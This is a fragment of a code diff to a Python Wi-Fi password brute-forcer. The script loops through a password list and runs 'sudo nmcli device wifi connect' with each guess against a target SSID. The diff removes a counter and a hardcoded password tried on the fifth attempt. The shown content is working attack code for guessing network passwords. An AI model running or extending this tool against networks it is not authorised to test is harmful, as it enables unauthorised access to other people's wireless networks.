@@ -47,7 +47,6 @@ time.sleep(0.02)
 pswd_lst = pas()
 
 # bruteforcer
-count = 0
 
 for pswd in pswd_lst:
 
@@ -55,10 +54,7 @@ for pswd in pswd_lst:
         continue
     
     try:
-	    if(count == 5):
-                pswd_1 = "24062005"
 	    pswd_1 = (f"{pswd}")
-	    count += 1
 	    print("trying : " + pswd)
 	    cmd = ['sudo','nmcli', '--ask', 'device', 'wifi', 'connect', ssid, 'password', pswd_1]
 	    result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
